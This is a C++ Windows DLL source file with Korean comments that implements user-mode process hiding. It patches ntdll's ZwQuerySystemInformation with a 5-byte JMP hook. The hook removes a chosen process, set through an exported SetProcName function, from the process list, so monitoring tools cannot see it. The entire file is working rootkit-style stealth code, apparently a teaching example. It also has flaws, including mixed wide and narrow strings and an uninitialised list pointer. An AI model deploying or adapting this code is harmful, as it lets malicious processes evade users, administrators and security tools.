// dllmain.cpp : DLL 응용 프로그램의 진입점을 정의합니다.
#include "stdafx.h"

#define STATUS_SUCCESS						(0x00000000L) 

typedef LONG NTSTATUS;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37, SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	BYTE Reserved1[48];
	PVOID Reserved2[3];
	HANDLE UniqueProcessId;
	PVOID Reserved3;
	ULONG HandleCount;
	BYTE Reserved4[4];
	PVOID Reserved5[11];
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved6[6];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI *PFZWQUERYSYSTEMINFORMATION)
(SYSTEM_INFORMATION_CLASS SystemInformationClass,
PVOID SystemInformation,
ULONG SystemInformationLength,
PULONG ReturnLength);

#define DEF_NTDLL                       ("ntdll.dll")
#define DEF_ZWQUERYSYSTEMINFORMATION    ("ZwQuerySystemInformation")


// Global Variable (in sharing memory)
#pragma comment(linker, "/SECTION:.SHARE,RWS")
#pragma data_seg(".SHARE")
char g_szProcName[MAX_PATH] = { 0, };
#pragma data_seg()

// Global Variable
BYTE g_pOrgBytes[5] = { 0, };


BOOL hook_by_code(LPCTSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)
{
	FARPROC pfnOrg;
	DWORD dwOldProtect, dwAddress;
	BYTE pBuf[5] = { 0xE9, 0, };
	PBYTE pByte;

	// 후킹 대상 API 주소를 구한다
	pfnOrg = (FARPROC)GetProcAddress(GetModuleHandle(szDllName), szFuncName);
	pByte = (PBYTE)pfnOrg;

	// 만약 이미 후킹 되어 있다면 return FALSE
	if (pByte[0] == 0xE9)
		return FALSE;

	// 5 byte 패치를 위하여 메모리에 WRITE 속성 추가
	VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	// 기존 코드 (5 byte) 백업
	memcpy(pOrgBytes, pfnOrg, 5);

	// JMP 주소 계산 (E9 XXXX)
	// => XXXX = pfnNew - pfnOrg - 5
	dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - 5;
	memcpy(&pBuf[1], &dwAddress, 4);

	// Hook - 5 byte 패치 (JMP XXXX)
	memcpy(pfnOrg, pBuf, 5);

	// 메모리 속성 복원
	VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &dwOldProtect);

	return TRUE;
}


BOOL unhook_by_code(LPCTSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)
{
	FARPROC pFunc;
	DWORD dwOldProtect;

	// API 주소 구한다
	pFunc = GetProcAddress(GetModuleHandle(szDllName), szFuncName);

	// 원래 코드(5 byte)를 덮어쓰기 위해 메모리에 WRITE 속성 추가
	VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	// Unhook
	memcpy(pFunc, pOrgBytes, 5);

	// 메모리 속성 복원
	VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

	return TRUE;
}


NTSTATUS WINAPI NewZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength)
{
	NTSTATUS status;
	FARPROC pFunc;
	PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
	char szProcName[MAX_PATH] = { 0, };

	// 작업 전에 unhook
	unhook_by_code(L"ntdll.dll", "ZwQuerySystemInformation", g_pOrgBytes);

	// original API 호출
	pFunc = GetProcAddress(GetModuleHandle(L"ntdll.dll"),
		"ZwQuerySystemInformation");
	status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)
		(SystemInformationClass, SystemInformation,
		SystemInformationLength, ReturnLength);

	if (status != STATUS_SUCCESS)
		goto __NTQUERYSYSTEMINFORMATION_END;

	// SystemProcessInformation 인 경우만 작업함
	if (SystemInformationClass == SystemProcessInformation)
	{
		// SYSTEM_PROCESS_INFORMATION 타입 캐스팅
		// pCur 는 single linked list 의 head
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

		while (TRUE)
		{
			// wide character => multi byte 변환
			WideCharToMultiByte(CP_ACP, 0, (PWSTR)pCur->Reserved2[1],
				-1, szProcName, MAX_PATH, NULL, NULL);

			// 프로세스 이름 비교
			// g_szProcName = 은폐하려는 프로세스 이름
			// (=> SetProcName() 에서 세팅됨)
			if (!_strcmpi(szProcName, g_szProcName))
			{
				// 연결 리스트에서 은폐 프로세스 제거
				if (pCur->NextEntryOffset == 0)
					pPrev->NextEntryOffset = 0;
				else
					pPrev->NextEntryOffset += pCur->NextEntryOffset;
			}
			else
				pPrev = pCur;

			if (pCur->NextEntryOffset == 0)
				break;

			// 연결 리스트의 다음 항목
			pCur = (PSYSTEM_PROCESS_INFORMATION)
				((ULONG)pCur + pCur->NextEntryOffset);
		}
	}

__NTQUERYSYSTEMINFORMATION_END:

	// 함수 종료 전에 다시 API Hooking
	hook_by_code(L"ntdll.dll", "ZwQuerySystemInformation",
		(PROC)NewZwQuerySystemInformation, g_pOrgBytes);

	return status;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	char            szCurProc[MAX_PATH] = { 0, };
	char            *p = NULL;

	// #1. 예외처리 : 현재 프로세스가 WhoRU.exe 라면 후킹하지 않고 종료
	GetModuleFileName(NULL, (LPWSTR)szCurProc, MAX_PATH);
	p = strrchr(szCurProc, '\\');
	if ((p != NULL) && !_stricmp(p + 1, "WhoRU.exe"))
		return TRUE;

	switch (fdwReason)
	{
		// #2. API Hooking
	case DLL_PROCESS_ATTACH:
		hook_by_code(L"ntdll.dll", "ZwQuerySystemInformation",
			(PROC)NewZwQuerySystemInformation, g_pOrgBytes);
		break;

		// #3. API Unhooking 
	case DLL_PROCESS_DETACH:
		unhook_by_code(L"ntdll.dll", "ZwQuerySystemInformation",
			g_pOrgBytes);
		break;
	}

	return TRUE;
}


#ifdef __cplusplus
extern "C" {
#endif
	__declspec(dllexport) void SetProcName(LPCTSTR szProcName)
	{
		strcpy_s(g_szProcName, (const char *)szProcName);
	}
#ifdef __cplusplus
}
#endif